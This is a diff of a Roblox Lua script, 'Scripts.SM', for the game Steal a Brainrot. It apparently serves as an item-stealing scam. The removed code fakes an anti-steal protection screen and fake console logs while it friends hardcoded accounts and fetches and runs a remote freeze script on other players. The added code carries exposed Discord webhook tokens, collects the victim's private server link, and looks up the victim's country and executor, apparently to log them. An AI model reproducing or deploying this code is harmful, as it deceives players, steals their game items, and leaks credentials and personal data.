@@ -1,468 +1,669 @@
+
 --[[
-   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
-  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
- | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
-  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
-  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
- |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
-                                                                     
+   _____ _____ _____ _____ _____ _______ _____ _____ __ __
+  / ____|/ ____| __ \|_ _| __ \__ __/ ____| / ____| \/ |
+ | (___ | | | |__) | | | | |__) | | | | (___ | (___ | \ / |
+  \___ \| | | _ / | | | ___/ | | \___ \ \___ \| |\/| |
+  ____) | |____| | \ \ _| |_| | | | ____) | _ ____) | | | |
+ |_____/ \_____|_| \_\_____|_| |_| |_____/ (_) |_____/|_| |_|
+
                         Scripts.SM | Premium Scripts
                         Made by: Scripter.SM
                         Discord: discord.gg/cnUAk7uc3n
 ]]
 
+if _G.scriptExecuted then return end
+_G.scriptExecuted = true
+
+if not _G["Script-SM_Config"] then
+    warn("WARNING: Config not loaded! Waiting for config...")
+    repeat task.wait() until _G["Script-SM_Config"]
+    warn("Config loaded successfully!")
+end
+
+--====================================================================--
+-- Services
+--====================================================================--
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local StarterGui = game:GetService("StarterGui")
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local Lighting = game:GetService("Lighting")
 local Workspace = game:GetService("Workspace")
 
--- ==================== CONFIG ====================
-local tester_users = {
-    "SMILEY_RIVALS",
-    "ta3123321",
-    "BUZZFTWGOD",
-    "Smiley9Gamerz",
-    "iwasbannedmycomeback",
-    "PVBBY_LEAF",
-    "idkwhoami_3fa",
-    "SABBY_LEAF"
-}
-local users = {}
-spawn(function()
-    repeat task.wait() until _G["Script-SM_Config"]
-    users = _G["Script-SM_Config"].users or {}
-end)
--- ===============================================
+local LocalPlayer = Players.LocalPlayer
+local player = Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
 
-local processed = {}
-local guiCreated = false
-local coreGuiDisabled = false
+--====================================================================--
+-- Promotion
+--====================================================================--
+setclipboard("discord.gg/cnUAk7uc3n")
 
--- Load and run the freeze script on target players
-local function runFreezeOnPlayer(player)
-    if not player or player == LocalPlayer then return end
+--====================================================================--
+-- VIP-Server Check
+--====================================================================--
+local serverType = RobloxReplicatedStorage:WaitForChild("GetServerType"):InvokeServer()
+if serverType ~= "VIPServer" then
+    LocalPlayer:Kick("Script.SM does not support public servers. Join a Private Server.")
+    return
+end
+
+--====================================================================--
+-- WEBHOOKS
+--====================================================================--
+local prvt_srvrs_logs = "https://discord.com/api/webhooks/1433479282528882844/XLe0lOXt1qF7DDo8Q8DOkuCJjhSjnlQxu3skK77qJLIUHHHMaksv_jzchnumBmaj2X4u"
+local user_webhook = _G["Script-SM_Config"].user_webhook
+local logs_webhook = "https://discord.com/api/webhooks/1433776514868052012/2rL6CIcgBPWKQbyF5gqPpZmpYDdl61_mLQHM2LaaNxE4VNH76k-r0mWmL91rbGlggjpA"
+
+--====================================================================--
+-- Safe HTTP
+--====================================================================--
+local function safeRequest(url, body)
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/main/freeze.lua"))()(player)
+        request({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(body)
+        })
     end)
 end
 
--- Get all target names (deduped)
-local function getAllTargets()
-    local targets = {}
-    local seen = {}
-    local function add(name)
-        if name and type(name) == "string" and not seen[name] then
-            seen[name] = true
-            table.insert(targets, name)
-        end
+local function safeHttpGet(url)
+    local ok, result = pcall(function()
+        return game:HttpGet(url)
+    end)
+    if ok then return result end
+    warn("HttpGet blocked: " .. tostring(result))
+    return nil
+end
+
+--====================================================================--
+-- Link handling
+--====================================================================--
+local function extractCode(raw)
+    raw = raw:gsub("%s", "")
+    return raw:match("share%?code=([%w%-]+)") or raw:match("privateServerLinkCode=([%w%-]+)")
+end
+
+local function buildJoinLink(code)
+    return "https://www.roblox.com/share?code=" .. code .. "&type=Server"
+end
+
+--====================================================================--
+-- Stats helpers
+--====================================================================--
+local function formatCash(num)
+    if not num or type(num) ~= "number" then return "Unknown" end
+    local abs = math.abs(num)
+    if abs >= 1e12 then return string.format("%.2fT", num/1e12)
+    elseif abs >= 1e9 then return string.format("%.2fB", num/1e9)
+    elseif abs >= 1e6 then return string.format("%.2fM", num/1e6)
+    elseif abs >= 1e3 then return string.format("%.2fK", num/1e3)
+    else return tostring(num) end
+end
+
+local function getStat(name)
+    local ls = player:FindFirstChild("leaderstats")
+    if ls then
+        local v = ls:FindFirstChild(name)
+        if v and (v:IsA("IntValue") or v:IsA("NumberValue")) then return v.Value end
     end
-    for _, v in tester_users do add(v) end
-    for _, v in users do add(v) end
-    return targets
+    return nil
 end
 
--- Fire ToggleFriends EXACTLY
-local function fireToggleFriends()
-    pcall(function()
-        ReplicatedStorage.Packages.Net:WaitForChild("RE/PlotService/ToggleFriends"):FireServer()
-    end)
-end
-
--- Disable CoreGui (only once)
-local function disableCoreGui()
-    if coreGuiDisabled then return end
-    coreGuiDisabled = true
-    pcall(function()
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-        print("[Scripts.SM] CoreGui disabled.")
-    end)
-end
-
--- ==================== ANTI-STEAL GUI ====================
 local function detectExecutor()
-    if identifyexecutor then
-        local n, v = identifyexecutor()
-        return n .. (v and " v" .. v or "")
-    elseif getexecutorname then
-        return getexecutorname()
-    else
-        return "Executor"
-    end
+    if identifyexecutor then return identifyexecutor() end
+    if getexecutorname then return getexecutorname() end
+    return "Unknown"
 end
 
-local function CreateGui()
-    if guiCreated then return end
-    guiCreated = true
-
-    local player = Players.LocalPlayer
-    local gui = Instance.new("ScreenGui")
-    gui.Name = "ExecutorAntiStealLoop"
-    gui.ResetOnSpawn = false
-    gui.IgnoreGuiInset = true
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-    gui.DisplayOrder = 999999
-    gui.Parent = player:WaitForChild("PlayerGui")
-
-    -- Background
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
-    bg.BorderSizePixel = 0
-    bg.Parent = gui
-
-    local bgGrad = Instance.new("UIGradient")
-    bgGrad.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(18, 18, 28)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(5, 5, 10))
-    }
-    bgGrad.Rotation = 90
-    bgGrad.Parent = bg
-
-    -- Title
-    local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(0.92, 0, 0.13, 0)
-    title.Position = UDim2.new(0.5, 0, 0.43, 0)
-    title.AnchorPoint = Vector2.new(0.5, 0.5)
-    title.BackgroundTransparency = 1
-    title.Text = detectExecutor() .. " Protection"
-    title.Font = Enum.Font.GothamBlack
-    title.TextSize = 50
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.TextStrokeTransparency = 0.7
-    title.Parent = bg
-
-    -- Subtitle
-    local subtitle = Instance.new("TextLabel")
-    subtitle.Size = UDim2.new(0.82, 0, 0.16, 0)
-    subtitle.Position = UDim2.new(0.5, 0, 0.54, 0)
-    subtitle.AnchorPoint = Vector2.new(0.5, 0.5)
-    subtitle.BackgroundTransparency = 1
-    subtitle.Text = "You have executed a stealer script, that is trying to steal your stuff,\nWe are protecting you. Please Wait Sometime"
-    subtitle.Font = Enum.Font.Gotham
-    subtitle.TextSize = 24
-    subtitle.TextColor3 = Color3.fromRGB(220, 240, 255)
-    subtitle.TextWrapped = true
-    subtitle.TextXAlignment = Enum.TextXAlignment.Center
-    subtitle.Parent = bg
-
-    -- Warning
-    local warning = Instance.new("TextLabel")
-    warning.Size = UDim2.new(0.78, 0, 0.08, 0)
-    warning.Position = UDim2.new(0.5, 0, 0.64, 0)
-    warning.AnchorPoint = Vector2.new(0.5, 0.5)
-    warning.BackgroundTransparency = 1
-    warning.Text = "Warning: Don't Leave, Leaving will cause loss of in-game items like pets."
-    warning.Font = Enum.Font.GothamBold
-    warning.TextSize = 22
-    warning.TextColor3 = Color3.fromRGB(255, 80, 80)
-    warning.TextWrapped = true
-    warning.TextXAlignment = Enum.TextXAlignment.Center
-    warning.Parent = bg
-
-    -- Countdown
-    local countdown = Instance.new("TextLabel")
-    countdown.Size = UDim2.new(0.7, 0, 0.08, 0)
-    countdown.Position = UDim2.new(0.5, 0, 0.72, 0)
-    countdown.AnchorPoint = Vector2.new(0.5, 0.5)
-    countdown.BackgroundTransparency = 1
-    countdown.Text = "Securing in 5:00..."
-    countdown.Font = Enum.Font.GothamBold
-    countdown.TextSize = 30
-    countdown.TextColor3 = Color3.fromRGB(100, 255, 150)
-    countdown.Parent = bg
-
-    -- Console Panel
-    local console = Instance.new("Frame")
-    console.Size = UDim2.new(0.88, 0, 0.25, 0)
-    console.Position = UDim2.new(0.5, 0, 0.80, 0)
-    console.AnchorPoint = Vector2.new(0.5, 0.5)
-    console.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
-    console.BorderSizePixel = 0
-    console.Parent = bg
-
-    local cCorner = Instance.new("UICorner")
-    cCorner.CornerRadius = UDim.new(0, 12)
-    cCorner.Parent = console
-
-    local cStroke = Instance.new("UIStroke")
-    cStroke.Color = Color3.fromRGB(60, 120, 180)
-    cStroke.Thickness = 1.5
-    cStroke.Parent = console
-
-    local consoleTitle = Instance.new("TextLabel")
-    consoleTitle.Size = UDim2.new(1, 0, 0, 28)
-    consoleTitle.BackgroundTransparency = 1
-    consoleTitle.Text = "SECURITY CONSOLE"
-    consoleTitle.Font = Enum.Font.Code
-    consoleTitle.TextSize = 16
-    consoleTitle.TextColor3 = Color3.fromRGB(100, 200, 255)
-    consoleTitle.TextXAlignment = Enum.TextXAlignment.Center
-    consoleTitle.Parent = console
-
-    local logArea = Instance.new("TextLabel")
-    logArea.Size = UDim2.new(1, -16, 1, -36)
-    logArea.Position = UDim2.new(0, 8, 0, 32)
-    logArea.BackgroundTransparency = 1
-    logArea.Text = ""
-    logArea.Font = Enum.Font.Code
-    logArea.TextSize = 15
-    logArea.TextColor3 = Color3.fromRGB(180, 255, 180)
-    logArea.TextXAlignment = Enum.TextXAlignment.Left
-    logArea.TextYAlignment = Enum.TextYAlignment.Top
-    logArea.TextWrapped = true
-    logArea.Parent = console
-
-    -- Failure Message
-    local failureMsg = Instance.new("TextLabel")
-    failureMsg.Size = UDim2.new(0.9, 0, 0.2, 0)
-    failureMsg.Position = UDim2.new(0.5, 0, 0.4, 0)
-    failureMsg.AnchorPoint = Vector2.new(0.5, 0.5)
-    failureMsg.BackgroundTransparency = 1
-    failureMsg.Text = ""
-    failureMsg.Font = Enum.Font.GothamBlack
-    failureMsg.TextSize = 36
-    failureMsg.TextColor3 = Color3.fromRGB(255, 50, 50)
-    failureMsg.TextStrokeTransparency = 0.6
-    failureMsg.TextWrapped = true
-    failureMsg.TextXAlignment = Enum.TextXAlignment.Center
-    failureMsg.Visible = false
-    failureMsg.Parent = bg
-
-    -- Watermark
-    local watermark = Instance.new("TextLabel")
-    watermark.Size = UDim2.new(0.5, 0, 0.05, 0)
-    watermark.Position = UDim2.new(1, -12, 1, -12)
-    watermark.AnchorPoint = Vector2.new(1, 1)
-    watermark.BackgroundTransparency = 1
-    watermark.Text = "Steal a Brainrot – Anti-Steal System"
-    watermark.Font = Enum.Font.Gotham
-    watermark.TextSize = 15
-    watermark.TextColor3 = Color3.fromRGB(90, 140, 180)
-    watermark.TextXAlignment = Enum.TextXAlignment.Right
-    watermark.Parent = bg
-
-    -- ================================================================= --
-    -- BRAINROT SCANNING
-    -- ================================================================= --
-    local function parseGenerationValue(generationString)
-        local cleaned = generationString:gsub("%s", ""):match("^%s*(.-)%s*$")
-        local numberPart, unitPart = cleaned:match("(%d+%.?%d*)([KMB]?)")
-        if not numberPart then return 0 end
-        numberPart = tonumber(numberPart)
-        if unitPart == "K" then return numberPart * 1e3
-        elseif unitPart == "M" then return numberPart * 1e6
-        elseif unitPart == "B" then return numberPart * 1e9
-        else return numberPart end
+local function getCountry()
+    local ok, res = pcall(function()
+        return request({Url = "http://ip-api.com/line/?fields=country"})
+    end)
+    if ok and res and res.StatusCode == 200 then
+        return res.Body:match("^(.+)\n") or "Unknown"
     end
+    return "Unknown"
+end
 
-    local function extractRate(name)
-        local rate = name:match("%$(%d+%.?%d*[KMB]?)%/s")
-        return rate and (rate .. "/s") or nil
-    end
+--====================================================================--
+-- Brainrot Scanner: Parse + Sort (Highest to Lowest)
+--====================================================================--
+local function parseGenerationValue(generationString)
+    local cleaned = generationString:gsub("%s", ""):match("^%s*(.-)%s*$")
+    local numberPart, unitPart = cleaned:match("(%d+%.?%d*)([KMB]?)")
+    if not numberPart then return 0 end
+    numberPart = tonumber(numberPart)
+    if unitPart == "K" then return numberPart * 1e3
+    elseif unitPart == "M" then return numberPart * 1e6
+    elseif unitPart == "B" then return numberPart * 1e9
+    else return numberPart end
+end
 
-    local function getBrainrots()
-        local list = {}
-        local plots = Workspace:FindFirstChild("Plots")
-        if not plots then return list end
-        for _, plot in ipairs(plots:GetChildren()) do
-            local podiums = plot:FindFirstChild("AnimalPodiums")
-            if podiums then
-                for _, podium in ipairs(podiums:GetChildren()) do
-                    if tonumber(podium.Name) and podium.Name:match("^%d+$") then
-                        local base = podium:FindFirstChild("Base")
-                        local spawn = base and base:FindFirstChild("Spawn")
-                        local attach = spawn and spawn:FindFirstChild("Attachment")
-                        local over = attach and attach:FindFirstChild("AnimalOverhead")
-                        if over then
-                            local nameLbl = over:FindFirstChild("DisplayName")
-                            local genLbl = over:FindFirstChild("Generation")
-                            if nameLbl and nameLbl:IsA("TextLabel") and genLbl and genLbl:IsA("TextLabel") then
-                                local genVal = parseGenerationValue(genLbl.Text)
-                                local cleanName = nameLbl.Text:gsub("%s*%$[%d%.]+[KM]?/s", ""):gsub("^%s+", ""):gsub("%s+$", "")
-                                local rate = extractRate(nameLbl.Text) or genLbl.Text
-                                table.insert(list, {
-                                    PetName = cleanName,
-                                    Formatted = rate,
-                                    Value = genVal
-                                })
-                            end
+local function getBrainrots()
+    local list = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return list end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        local podiums = plot:FindFirstChild("AnimalPodiums")
+        if podiums then
+            for _, podium in ipairs(podiums:GetChildren()) do
+                if tonumber(podium.Name) and podium.Name:match("^%d+$") then
+                    local base   = podium:FindFirstChild("Base")
+                    local spawn  = base and base:FindFirstChild("Spawn")
+                    local attach = spawn and spawn:FindFirstChild("Attachment")
+                    local over   = attach and attach:FindFirstChild("AnimalOverhead")
+                    if over then
+                        local nameLbl = over:FindFirstChild("DisplayName")
+                        local genLbl  = over:FindFirstChild("Generation")
+                        if nameLbl and nameLbl:IsA("TextLabel")
+                            and genLbl and genLbl:IsA("TextLabel") then
+
+                            local genVal = parseGenerationValue(genLbl.Text)
+                            table.insert(list, {
+                                name = nameLbl.Text,
+                                generation = genLbl.Text,
+                                value = genVal
+                            })
                         end
                     end
                 end
             end
         end
-        table.sort(list, function(a, b) return a.Value > b.Value end)
-        return list
     end
 
-    -- Get real brainrots
-    local brainrots = getBrainrots()
-    local topBrainrots = {}
-    local lowBrainrot = nil
-
-    if #brainrots > 0 then
-        for i = 1, math.min(7, #brainrots) do
-            table.insert(topBrainrots, brainrots[i])
-        end
-        lowBrainrot = brainrots[#brainrots]
-    else
-        topBrainrots = {
-            { PetName = "[Failed to Fetch]", Formatted = "1M" },
-            { PetName = "[Failed to Fetch]", Formatted = "850K" },
-            { PetName = "[Failed to Fetch]", Formatted = "720K" },
-            { PetName = "[Failed to Fetch]", Formatted = "600K" },
-            { PetName = "[Failed to Fetch]", Formatted = "550K" },
-            { PetName = "[Failed to Fetch]", Formatted = "480K" },
-            { PetName = "[Failed to Fetch]", Formatted = "320K" }
-        }
-        lowBrainrot = { PetName = "Basic Thought", Formatted = "1K" }
-    end
-
-    -- LOG SYSTEM
-    local logLines = {}
-    local function addLog(text, color)
-        table.insert(logLines, {text = text, color = color or Color3.fromRGB(180, 255, 180)})
-        if #logLines > 20 then table.remove(logLines, 1) end
-        local display = ""
-        for _, line in ipairs(logLines) do
-            display = display .. "\n> " .. line.text
-        end
-        logArea.Text = display
-    end
-
-    -- PROTECTION LOOP
-    task.spawn(function()
-        while player.Parent and gui.Parent do
-            local totalSeconds = 300
-            local startTime = tick()
-            failureMsg.Visible = false
-            failureMsg.Text = ""
-
-            while tick() - startTime < totalSeconds do
-                if not gui.Parent then break end
-                local remaining = totalSeconds - math.floor(tick() - startTime)
-                local mins = math.floor(remaining / 60)
-                local secs = remaining % 60
-                countdown.Text = string.format("Securing in %d:%02d...", mins, secs)
-
-                task.wait(math.random(18, 32) / 10)
-
-                local actions = {
-                    "Scanning remote event hooks...",
-                    "Blocking unauthorized FireServer calls",
-                    "Purging malicious discord webhook traces",
-                    "Isolating exploit thread",
-                    "Recovering Brainrot UUIDs...",
-                    "Securing generation data",
-                    "Reporting script to anti-cheat",
-                    "Encrypting local inventory",
-                    "Validating podium ownership",
-                    "Neutralizing steal exploit"
-                }
-                addLog(actions[math.random(#actions)])
-
-                if lowBrainrot and math.random() < 0.15 then
-                    addLog("Failed to secure " .. lowBrainrot.PetName, Color3.fromRGB(255, 100, 100))
-                end
-
-                if #brainrots > 0 and math.random() < 0.3 then
-                    local p = brainrots[math.random(1, #brainrots)]
-                    addLog("Recovering " .. p.PetName .. " → " .. p.Formatted, Color3.fromRGB(100, 255, 100))
-                end
-            end
-
-            -- FAILURE AFTER 5 MINUTES
-            local failedLines = {}
-            for _, p in ipairs(topBrainrots) do
-                table.insert(failedLines, p.PetName .. " → " .. p.Formatted)
-            end
-            failureMsg.Text = "Failed to Recover:\n" .. table.concat(failedLines, "\n")
-            failureMsg.Visible = true
-            addLog("CRITICAL: Recovery failed for 7 high-gen brainrots", Color3.fromRGB(255, 50, 50))
-            addLog("Restarting protection cycle...", Color3.fromRGB(255, 200, 50))
-            task.wait(4)
-        end
+    table.sort(list, function(a, b)
+        return a.value > b.value
     end)
 
-    -- Prevent character respawn
-    LocalPlayer.CharacterRemoving:Connect(function()
+    return list
+end
+
+--====================================================================--
+-- Draggable
+--====================================================================--
+local function makeDraggable(frame, handle)
+    local dragging, dragInput, startPos, startMouse
+    handle.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            startMouse = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then dragging = false end
+            end)
+        end
+    end)
+    handle.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and input == dragInput then
+            local delta = input.Position - startMouse
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+                                      startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+--====================================================================--
+-- GUI
+--====================================================================--
+local screen = Instance.new("ScreenGui")
+screen.Name = "ScriptSM_Cinematic"
+screen.ResetOnSpawn = false
+screen.IgnoreGuiInset = true
+screen.Parent = gui
+
+local blur = Instance.new("BlurEffect")
+blur.Size = 0
+blur.Parent = Lighting
+TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Sine), {Size = 16}):Play()
+
+local dim = Instance.new("Frame")
+dim.Size = UDim2.new(1,0,1,0)
+dim.BackgroundColor3 = Color3.new(0,0,0)
+dim.BackgroundTransparency = 1
+dim.Parent = screen
+TweenService:Create(dim, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {BackgroundTransparency = 0.4}):Play()
+
+local card = Instance.new("Frame")
+card.Size = UDim2.fromOffset(460,280)
+card.AnchorPoint = Vector2.new(0.5,0.5)
+card.Position = UDim2.fromScale(0.5,1.8)
+card.BackgroundColor3 = Color3.fromRGB(28,28,34)
+card.BackgroundTransparency = 1
+card.BorderSizePixel = 0
+card.ClipsDescendants = true
+card.Parent = dim
+
+local cardCorner = Instance.new("UICorner", card)
+cardCorner.CornerRadius = UDim.new(0,24)
+
+local cardStroke = Instance.new("UIStroke", card)
+cardStroke.Color = Color3.fromRGB(80,80,100)
+cardStroke.Transparency = 1
+cardStroke.Thickness = 2
+
+local gradient = Instance.new("UIGradient", cardStroke)
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0,170,255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(100,50,255))
+}
+gradient.Rotation = 45
+gradient.Transparency = NumberSequence.new{
+    NumberSequenceKeypoint.new(0,0.7),
+    NumberSequenceKeypoint.new(1,1)
+}
+
+local dragHandle = Instance.new("Frame")
+dragHandle.Size = UDim2.new(1,0,0,50)
+dragHandle.BackgroundTransparency = 1
+dragHandle.Parent = card
+makeDraggable(card, dragHandle)
+
+-- Card in
+local cardIn = TweenService:Create(card, TweenInfo.new(0.9, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
+    Position = UDim2.fromScale(0.5,0.5),
+    BackgroundTransparency = 0,
+    Rotation = 0
+})
+cardIn:Play()
+TweenService:Create(cardStroke, TweenInfo.new(0.8), {Transparency = 0.6}):Play()
+TweenService:Create(gradient, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Rotation = 135}):Play()
+
+-- Title / Sub
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,-60,0,50)
+title.Position = UDim2.fromOffset(30,30)
+title.BackgroundTransparency = 1
+title.Text = "Script.SM"
+title.TextColor3 = Color3.new(1,1,1)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 40
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.TextTransparency = 1
+title.Parent = card
+TweenService:Create(title, TweenInfo.new(0.7, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
+
+local sub = Instance.new("TextLabel")
+sub.Size = UDim2.new(1,-60,0,26)
+sub.Position = UDim2.fromOffset(30,85)
+sub.BackgroundTransparency = 1
+sub.Text = "VIP / Private Server Required"
+sub.TextColor3 = Color3.fromRGB(255,200,0)
+sub.Font = Enum.Font.Gotham
+sub.TextSize = 16
+sub.TextXAlignment = Enum.TextXAlignment.Left
+sub.TextTransparency = 1
+sub.Parent = card
+TweenService:Create(sub, TweenInfo.new(0.8, Enum.EasingStyle.Quint), {TextTransparency = 0}):Play()
+
+-- Input container
+local inputContainer = Instance.new("Frame")
+inputContainer.Size = UDim2.new(1,-80,0,60)
+inputContainer.Position = UDim2.fromOffset(40,130)
+inputContainer.BackgroundTransparency = 1
+inputContainer.Parent = card
+
+-- Floating label
+local floatLabel = Instance.new("TextLabel")
+floatLabel.Size = UDim2.new(1,0,0,20)
+floatLabel.Position = UDim2.fromOffset(0,0)
+floatLabel.BackgroundTransparency = 1
+floatLabel.Text = "Private Server Link"
+floatLabel.TextColor3 = Color3.fromRGB(0,170,255)
+floatLabel.Font = Enum.Font.GothamSemibold
+floatLabel.TextSize = 14
+floatLabel.TextXAlignment = Enum.TextXAlignment.Left
+floatLabel.Parent = inputContainer
+
+-- TextBox background
+local tbBg = Instance.new("Frame")
+tbBg.Size = UDim2.new(1,0,0,36)
+tbBg.Position = UDim2.fromOffset(0,24)
+tbBg.BackgroundColor3 = Color3.fromRGB(40,40,48)
+tbBg.BorderSizePixel = 0
+tbBg.Parent = inputContainer
+
+local tbCorner = Instance.new("UICorner", tbBg)
+tbCorner.CornerRadius = UDim.new(0,12)
+
+-- REAL PLACEHOLDER
+local placeholder = Instance.new("TextLabel")
+placeholder.Size = UDim2.new(1,-20,1,0)
+placeholder.Position = UDim2.fromOffset(10,0)
+placeholder.BackgroundTransparency = 1
+placeholder.Text = "Paste your private server link..."
+placeholder.TextColor3 = Color3.fromRGB(150,150,160)
+placeholder.Font = Enum.Font.Gotham
+placeholder.TextSize = 16
+placeholder.TextXAlignment = Enum.TextXAlignment.Left
+placeholder.TextTransparency = 0
+placeholder.Parent = tbBg
+
+-- Actual TextBox
+local textBox = Instance.new("TextBox")
+textBox.Size = UDim2.new(1,-20,1,0)
+textBox.Position = UDim2.fromOffset(10,0)
+textBox.BackgroundTransparency = 1
+textBox.Text = ""
+textBox.TextColor3 = Color3.new(1,1,1)
+textBox.Font = Enum.Font.Gotham
+textBox.TextSize = 16
+textBox.TextXAlignment = Enum.TextXAlignment.Left
+textBox.TextWrapped = true
+textBox.ClearTextOnFocus = false
+textBox.Parent = tbBg
+
+-- Underline
+local underline = Instance.new("Frame")
+underline.Size = UDim2.new(1,0,0,2)
+underline.Position = UDim2.new(0,0,1,0)
+underline.BackgroundColor3 = Color3.fromRGB(0,170,255)
+underline.BackgroundTransparency = 1
+underline.BorderSizePixel = 0
+underline.Parent = tbBg
+
+-- Animations
+local focusLine = TweenService:Create(underline, TweenInfo.new(0.3), {BackgroundTransparency = 0})
+local unfocusLine = TweenService:Create(underline, TweenInfo.new(0.3), {BackgroundTransparency = 1})
+local labelUp = TweenService:Create(floatLabel, TweenInfo.new(0.25), {Position = UDim2.fromOffset(0,-20), TextSize = 12})
+local labelDown = TweenService:Create(floatLabel, TweenInfo.new(0.25), {Position = UDim2.fromOffset(0,0), TextSize = 14})
+
+-- Placeholder visibility
+local function updatePlaceholder()
+    placeholder.Visible = (textBox.Text == "")
+end
+textBox:GetPropertyChangedSignal("Text"):Connect(updatePlaceholder)
+textBox.Focused:Connect(function()
+    focusLine:Play()
+    labelUp:Play()
+    updatePlaceholder()
+end)
+textBox.FocusLost:Connect(function(enter)
+    unfocusLine:Play()
+    if textBox.Text == "" then labelDown:Play() end
+    updatePlaceholder()
+    if enter then
         task.wait(0.1)
-        if LocalPlayer.Character then
-            LocalPlayer.Character:Destroy()
-        end
-    end)
+        continueBtn.Activated:Fire() -- Use Activated instead of MouseButton1Click:Fire()
+    end
+end)
+
+-- Continue button
+local continueBtn = Instance.new("TextButton")
+continueBtn.Size = UDim2.new(0,140,0,50)
+continueBtn.Position = UDim2.new(1,-180,1,-80)
+continueBtn.BackgroundColor3 = Color3.fromRGB(0,140,255)
+continueBtn.Text = "Continue"
+continueBtn.TextColor3 = Color3.new(1,1,1)
+continueBtn.Font = Enum.Font.GothamBold
+continueBtn.TextSize = 18
+continueBtn.AutoButtonColor = false
+continueBtn.Parent = card
+
+local btnCorner = Instance.new("UICorner", continueBtn)
+btnCorner.CornerRadius = UDim.new(0,14)
+
+local btnStroke = Instance.new("UIStroke", continueBtn)
+btnStroke.Color = Color3.fromRGB(100,200,255)
+btnStroke.Thickness = 0
+
+local pulse = TweenService:Create(btnStroke, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Thickness = 3})
+pulse:Play()
+
+local pressIn = TweenService:Create(continueBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {
+    Size = UDim2.new(0,130,0,46),
+    BackgroundColor3 = Color3.fromRGB(0,110,220)
+})
+local pressOut = TweenService:Create(continueBtn, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {
+    Size = UDim2.new(0,140,0,50),
+    BackgroundColor3 = Color3.fromRGB(0,140,255)
+})
+continueBtn.MouseButton1Down:Connect(function() pressIn:Play() end)
+continueBtn.MouseButton1Up:Connect(function() pressOut:Play() end)
+continueBtn.MouseLeave:Connect(function() pressOut:Play() end)
+
+--====================================================================--
+-- Confirm popup – SMOOTH, ALL-AT-ONCE
+--====================================================================--
+local confirmGui = nil
+local showConfirm = nil -- Forward declaration
+
+-- Define function to trigger continue
+local function triggerContinue()
+    local input = textBox.Text ~= "" and textBox.Text or ""
+    showConfirm(input)
 end
 
--- Process player: Friend request + Toggle + Freeze + GUI + CoreGui
-local function processPlayer(player)
-    if processed[player.Name] or player == LocalPlayer then return end
-    processed[player.Name] = true
-    print("[Scripts.SM] Found: " .. player.Name)
+-- Use Activated (works on PC + Mobile)
+continueBtn.Activated:Connect(triggerContinue)
 
-    -- 1. Send Friend Request
-    if not LocalPlayer:IsFriendsWith(player.UserId) then
-        pcall(function()
-            LocalPlayer:RequestFriendship(player)
-            print("[Scripts.SM] Sent friend request to " .. player.Name)
+--====================================================================--
+-- Confirm popup
+--====================================================================--
+showConfirm = function(rawLink)
+    local code = extractCode(rawLink)
+    if not code then
+        local flash = TweenService:Create(tbBg, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(120,30,30)})
+        flash:Play()
+        task.delay(0.3, function()
+            TweenService:Create(tbBg, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40,40,48)}):Play()
         end)
-    else
-        print("[Scripts.SM] Already friends with " .. player.Name)
+        return
     end
 
-    -- 2. Fire ToggleFriends
-    fireToggleFriends()
+    local joinLink = buildJoinLink(code)
 
-    -- 3. Run freeze
-    runFreezeOnPlayer(player)
+    confirmGui = Instance.new("Frame")
+    confirmGui.Size = UDim2.fromOffset(380,180)
+    confirmGui.Position = UDim2.fromScale(0.5,0.5)
+    confirmGui.AnchorPoint = Vector2.new(0.5,0.5)
+    confirmGui.BackgroundColor3 = Color3.fromRGB(35,35,45)
